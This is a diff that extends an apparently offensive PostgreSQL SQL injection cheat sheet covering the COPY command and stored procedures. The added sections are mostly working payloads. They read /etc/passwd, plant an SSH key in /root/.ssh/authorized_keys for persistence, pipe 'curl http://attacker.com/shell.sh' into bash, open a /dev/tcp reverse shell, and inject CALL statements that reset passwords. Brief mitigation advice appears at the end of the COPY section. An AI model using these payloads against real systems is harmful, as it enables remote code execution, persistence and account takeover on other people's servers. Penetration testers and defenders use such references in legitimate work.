@@ -155,7 +155,70 @@ SELECT database_to_xmlschema(true, true, '');
 
 ### COPY Command
 
-PostgreSQL's COPY is unique and powerful. File operations require superuser or `pg_write_server_files`/`pg_read_server_files` roles. PROGRAM operations require superuser or `pg_execute_server_program` role (PostgreSQL 11+).
+PostgreSQL's COPY is unique and powerful for file I/O and command execution. See also: [Reading Files](/postgresql/reading-files) and [Command Execution](/postgresql/command-execution).
+
+**Permission Requirements:**
+
+| Operation               | Required Privilege                                        |
+| ----------------------- | --------------------------------------------------------- |
+| `COPY ... TO FILE`      | Superuser or `pg_write_server_files` (PostgreSQL 11+)     |
+| `COPY ... FROM FILE`    | Superuser or `pg_read_server_files` (PostgreSQL 11+)      |
+| `COPY ... TO PROGRAM`   | Superuser or `pg_execute_server_program` (PostgreSQL 11+) |
+| `COPY ... FROM PROGRAM` | Superuser or `pg_execute_server_program` (PostgreSQL 11+) |
+| `COPY ... FROM STDIN`   | Table INSERT privilege only (no file/program access)      |
+
+**File Read (requires pg_read_server_files or superuser):**
+
+```sql
+-- Read file contents into a table
+CREATE TEMP TABLE file_contents (line TEXT);
+COPY file_contents FROM '/etc/passwd';
+SELECT * FROM file_contents;
+
+-- In injection context (stacked query)
+'; CREATE TEMP TABLE t(c TEXT); COPY t FROM '/etc/passwd'; --
+```
+
+**File Write (requires pg_write_server_files or superuser):**
+
+```sql
+-- Write query results to file
+COPY (SELECT 'malicious content') TO '/tmp/evil.txt';
+
+-- Write SSH key for persistence
+COPY (SELECT '-----BEGIN RSA PRIVATE KEY-----...') TO '/root/.ssh/authorized_keys';
+```
+
+**Command Execution (requires pg_execute_server_program or superuser):**
+
+```sql
+-- Execute OS command and capture output
+CREATE TEMP TABLE cmd_output (line TEXT);
+COPY cmd_output FROM PROGRAM 'id; whoami; uname -a';
+SELECT * FROM cmd_output;
+
+-- Execute command without capturing output
+COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/shell.sh | bash';
+
+-- Reverse shell
+COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"';
+```
+
+**COPY FROM STDIN (lower privilege, requires INSERT only):**
+
+```sql
+-- Used in multi-statement injection when you control input stream
+COPY users (username, password) FROM STDIN;
+attacker    hacked
+\.
+```
+
+**Mitigation:**
+
+- Never grant `pg_read_server_files`, `pg_write_server_files`, or `pg_execute_server_program` to application users
+- Use connection poolers (PgBouncer) in transaction mode which blocks multi-statement COPY attacks
+- Disable `COPY ... PROGRAM` at compile time if not needed (`--disable-copy-program`)
+- Monitor for COPY commands in query logs
 
 ### Large Objects
 
@@ -337,13 +400,37 @@ SELECT json_agg(row_to_json(u)) FROM users u;
 
 #### Procedures (11+)
 
+PostgreSQL 11+ supports stored procedures with `CALL`. Exploiting procedures requires **prior enumeration** to discover procedure names and signatures.
+
+**Enumerating Procedures:**
+
 ```sql
--- Call existing procedure (if known)
+-- List all user-defined procedures (not functions)
+SELECT n.nspname AS schema, p.proname AS procedure, pg_get_function_arguments(p.oid) AS args
+FROM pg_proc p
+JOIN pg_namespace n ON p.pronamespace = n.oid
+WHERE p.prokind = 'p'  -- 'p' = procedure (vs 'f' = function)
+AND n.nspname NOT IN ('pg_catalog', 'information_schema');
+
+-- Find procedures with interesting names
+SELECT proname FROM pg_proc WHERE prokind = 'p'
+AND proname ~* '(admin|password|reset|auth|user|delete|update)';
+```
+
+**Calling Procedures in Injection Context:**
+
+```sql
+-- Direct CALL (if you know the procedure name and arguments)
 CALL schema.procedure_name(arg1, arg2);
 
--- In injection context (requires knowing procedure names)
+-- In stacked query injection (requires knowing procedure signature)
 '; CALL admin_reset_password('attacker', 'newpass') --
+
+-- Enumerate first, then exploit
+'; SELECT proname, pg_get_function_arguments(oid) FROM pg_proc WHERE prokind='p' --
 ```
+
+**Note:** Unlike functions, procedures cannot be called in SELECT statements—they require the `CALL` statement, which typically needs stacked query support in the injection context.
 
 #### Other Version Features
 
